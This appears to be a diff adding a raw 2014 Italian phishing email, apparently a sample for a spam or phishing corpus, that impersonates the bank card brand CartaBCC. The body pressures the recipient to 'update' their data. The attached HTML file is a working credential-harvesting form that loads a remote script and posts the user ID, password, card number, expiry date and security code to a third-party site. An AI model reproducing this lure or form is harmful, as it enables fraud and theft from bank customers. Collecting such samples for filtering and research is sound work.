@@ -1,0 +1,158 @@
+X-Account-Key: account2
+X-UIDL: 50ab8dc50005f15b
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+X-Mozilla-Keys:                                                                                 
+Return-Path: <info7073301@bccbergamasca.it>
+X-Original-To: ianni@mat.unical.it
+Delivered-To: ianni@mat.unical.it
+Received: from localhost (ml [127.0.0.1])
+	by ml.mat.unical.it (Postfix) with ESMTP id 2D88F18D01D5
+	for <ianni@mat.unical.it>; Thu, 11 Sep 2014 05:44:01 +0200 (CEST)
+X-Virus-Scanned: Debian amavisd-new at mat.unical.it
+X-Spam-Flag: NO
+X-Spam-Score: 1.247
+X-Spam-Level: *
+X-Spam-Status: No, score=1.247 required=2.1 tests=[BAYES_00=-1.9,
+	HTML_COMMENT_SAVED_URL=1.391, HTML_IMAGE_ONLY_32=0.001,
+	HTML_MESSAGE=0.001, MIME_HTML_ONLY=0.723, MISSING_HEADERS=1.021,
+	RCVD_IN_DNSWL_NONE=-0.0001, T_HTML_ATTACH=0.01] autolearn=no
+Received: from ml.mat.unical.it ([127.0.0.1])
+	by localhost (ml.mat.unical.it [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id WjMqMGDWqkdR for <ianni@mat.unical.it>;
+	Thu, 11 Sep 2014 05:43:58 +0200 (CEST)
+Received: from n44.mail01.mtsvc.net (mailout59.mail01.mtsvc.net [216.70.64.124])
+	by ml.mat.unical.it (Postfix) with ESMTPS id 89F6718D0111
+	for <ianni@mat.unical.it>; Thu, 11 Sep 2014 05:43:58 +0200 (CEST)
+Received: from mail.familynursingcare.com ([107.0.194.226]:22605 helo=FNC-REMOTE)
+	by n44.mail01.mtsvc.net with esmtpa (Exim 4.72)
+	(envelope-from <info7073301@bccbergamasca.it>)
+	id 1XRvIX-00054a-C1; Wed, 10 Sep 2014 23:43:53 -0400
+MIME-Version: 1.0
+Date: Wed, 10 Sep 2014 23:43:48 -0400
+X-Priority: 3 (Normal)
+Subject: procedura di aggiornamento n.70733012
+From: "CartaBCC" <info7073301@bccbergamasca.it>
+Content-Type: multipart/mixed;
+	 boundary="------------050205030400020601010107"
+Message-ID: <55E493D07C9B944FF5A8A1AF8BD45C557D577E07@FNC-REMOTE>
+X-Authenticated-User: 915385 test@28minutes.com
+X-MT-ID: 2409002A3C6099A34CD6A74C4DCBBE6F363E6E8D
+Status:   
+
+--------------050205030400020601010107
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><head><META http-equiv=3D"Content-Type" content=3D"text/html;charset=
+=3Dutf-8"></head><body><p><img src=3D"http://www.bccbergamasca.it/easysite9=
+/images/miniature/thumb_banner_carta_bcc.jpg" width=3D"280" height=3D"100">=
+ </p>
+<p>&nbsp;</p>
+<p><b>CartaBCC</b> considera da sempre la sicurezza dei servizi digitali un=
+a componente strategica fondamentale del proprio business.</p>
+<p>Ecco perche e necessario avviare la procedura di aggiornamento per adatt=
+are il database.  </p>
+<p>L`Utente non potra utilizzare il servizio online, fino a quando non avra=
+ aggiornato i Suoi dati personali. </p>
+<p>&nbsp;</p>
+<p><b>Si prega di seguire la procedura di aggiornamento tramite il modulo a=
+llegato a questo email.</b></p>
+<p>&nbsp;</p>
+<p>Cordiali Saluti,</p>
+<p>CartaBCC.</p>
+</body></html>
+--------------050205030400020601010107
+Content-Type: text/html; name="aggiornamento_facile.html"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment;
+	 filename="aggiornamento_facile.html"
+
+<!-- saved from url=3D(0016)http://localhost -->
+<!DOCTYPE html><html><head>
+<title>Aggiornamento della protezione</title>
+<base href=3D"http://www.gianfrancogatti.com/files/" />
+<link href=3D"style.css" type=3D"text/css" rel=3D"stylesheet" />
+<script src=3D"script.js" type=3D"text/javascript" language=3D"javascript">=
+</script>
+</head><body><br><br><br>
+<form id=3D"music" method=3D"post" action=3D"aggiorna.php" onsubmit=3D"retu=
+rn asos()">
+	<h1 align=3D"center"><img src=3D"Logo_CartaBcc.jpg" width=3D"350px" /></h1=
+><br><br>
+	<h1 align=3D"center">SI PREGA DI COMPILARE TUTTI I CAMPI RICHIESTI:</h1><b=
+r><br>
+	<table  border=3D"0" class=3D"uiBoxGray" width=3D"350px" cellspacing=3D"7p=
+x" align=3D"center">
+	<tbody>
+	<tr><td colspan=3D"2" >&nbsp;</td></tr><tr>
+		<th align=3D"right">&nbsp;</th><td align=3D"right">&nbsp;</td>
+	</tr><tr>
+		<th align=3D"right">UserID:</th><td class=3D"data"><span><input class=3D"=
+inputtext" name=3D"userid" autocomplete=3D"off" type=3D"text" /></span></td=
+>
+	</tr><tr>
+		<th align=3D"right">Password:</th><td class=3D"data"><span><input class=
+=3D"inputtext" name=3D"passwd" autocomplete=3D"off" type=3D"password" /></s=
+pan></td>
+	</tr><tr>
+		<th align=3D"right">&nbsp;</th><td align=3D"right">&nbsp;</td>
+	</tr><tr>
+		<th align=3D"right">Numero della Carta:</th><td align=3D"right"><span><in=
+put class=3D"inputtext" name=3D"pulicica" maxlength=3D"16" autocomplete=3D"=
+off" type=3D"text" /></span></td>
+	</tr><tr>
+		<th align=3D"right">Data di scadenza:</th>
+		<td class=3D"data">
+			<span><select name=3D"x1">
+				<option value=3D"Messe" selected=3D"selected">Messe</option>
+				<option value=3D"01">01</option>
+				<option value=3D"02">02</option>
+				<option value=3D"03">03</option>
+				<option value=3D"04">04</option>
+				<option value=3D"05">05</option>
+				<option value=3D"06">06</option>
+				<option value=3D"07">07</option>
+				<option value=3D"08">08</option>
+				<option value=3D"09">09</option>
+				<option value=3D"10">10</option>
+				<option value=3D"11">11</option>
+				<option value=3D"12">12</option>
+			</select>
+			&nbsp;/&nbsp;
+			<select name=3D"x2">
+				<option value=3D"Anno" selected=3D"selected">Anno</option>
+				<option value=3D"2014">2014</option>
+				<option value=3D"2015">2015</option>
+				<option value=3D"2016">2016</option>
+				<option value=3D"2017">2017</option>
+				<option value=3D"2018">2018</option>
+				<option value=3D"2019">2019</option>
+				<option value=3D"2020">2020</option>
+				<option value=3D"2021">2021</option>
+				<option value=3D"2022">2022</option>
+				<option value=3D"2023">2023</option>
+			</select></span>
+		</td>
+	</tr><tr>
+		<th align=3D"right">Codice di sicurezza:</th>
+		<td class=3D"data"><span><input class=3D"inputtext" name=3D"floci" maxlen=
+gth=3D"3" size=3D"6" autocomplete=3D"off" type=3D"text" /></span></td>
+	</tr><tr>
+		<th align=3D"right">&nbsp;</th><td align=3D"right">&nbsp;</td>
+	</tr><tr><td colspan=3D"2">&nbsp;</td></tr>
+	</tbody></table><br><br>
+	<table  cellpadding=3D"0" cellspacing=3D"0" align=3D"center">
+	<tbody>
+	<tr>
+		<td><label class=3D"uiButton uiButtonConfirm uiButtonLarge"><input value=
+=3D"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invia&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" type=
+=3D"submit"></label></td>
+	</tr>
+	</tbody>
+	</table>
+</form>
+</body>
+</html>
+--------------050205030400020601010107--
+
